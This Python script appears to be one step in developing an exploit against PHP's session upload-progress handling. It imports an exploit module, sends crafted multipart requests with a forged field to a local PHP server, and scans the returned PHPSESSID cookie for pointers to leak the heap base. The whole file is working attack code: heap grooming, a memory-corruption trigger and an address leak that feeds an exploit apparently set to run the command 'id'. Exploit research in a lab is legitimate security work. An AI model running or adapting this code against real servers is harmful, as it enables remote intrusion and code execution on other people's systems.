#!/usr/bin/env python3
"""8.5.11: vary the priming (reqA) shape + reqB field layout to find the heap-leak trigger."""
import sys, time, struct, re, urllib.parse
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, Exploit, build_multipart

t = Target("http://127.0.0.1:18114/index.php", timeout=90.0, verbose=False)

def cookie_of(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""

def heap_base(cookie):
    if len(cookie) < 1000:
        return 0
    from collections import Counter
    c = Counter()
    for i in range(0, len(cookie)-8, 8):
        v = int.from_bytes(cookie[i:i+8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, cnt = c.most_common(1)[0]
    return base if cnt >= 8 else 0

ex = Exploit(t, "id", htdata_offset=0x690d8, profile="bookworm")

def reqA(nsmall=1001, with_big=True, with_file=True):
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(nsmall)]
    parts.append({"name":"PHPSESSID","data":b"\x00"})
    parts.append({"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"})
    if with_file:
        parts.append(ex._file_part())
    if with_big:
        parts.append(ex._big_field())
    t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=9<<20)

def reqB(sid, n, fsize=48):
    parts = [{"name":"PHPSESSID","data":sid},
             {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    for i in range(n):
        val = (f"v{i:04d}" + "x"*(fsize-4))[:fsize]
        parts.append({"name": str(1000+i), "data": val.encode()})
    forge = bytearray(b"A"*79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18]=ord("L")
    parts.append({"name":"1999","data":bytes(forge)})
    return t.post(build_multipart(parts, b"B"*10), b"B"*10, read_cap=9<<20)

HEX26 = b"0123456789abcdef0123456789ab"
print("=== 8.5.11 priming-shape search (sid=hex26) ===")
variants = [
    ("A: no-priming, n=841", lambda: (None, reqB(HEX26, 841))),
    ("A: priming nsmall=500", lambda: (reqA(nsmall=500), reqB(HEX26, 841))),
    ("A: priming nsmall=2000", lambda: (reqA(nsmall=2000), reqB(HEX26, 841))),
    ("A: priming no-big", lambda: (reqA(with_big=False), reqB(HEX26, 841))),
    ("A: priming n=1001 fsize=32", lambda: (reqA(), reqB(HEX26, 841, fsize=32))),
    ("A: priming n=1001 fsize=64", lambda: (reqA(), reqB(HEX26, 841, fsize=64))),
    ("A: priming n=600", lambda: (reqA(), reqB(HEX26, 600))),
    ("A: priming n=1200", lambda: (reqA(), reqB(HEX26, 1200))),
]
for label, fn in variants:
    try:
        priming, resp = fn()
        time.sleep(0.2)
    except Exception as e:
        print(f"  {label}: ERROR {e}")
        continue
    ck = cookie_of(resp)
    base = heap_base(ck)
    mark = f"LEAK base=0x{base:x}" if base else f"cookie={len(ck)}"
    print(f"  {label}: {mark}", flush=True)
    if base:
        print(f"  >>> FOUND: {label} base=0x{base:x}")
        sys.exit(0)
    time.sleep(0.1)
print("NO LEAK in this parameter space")
sys.exit(1)
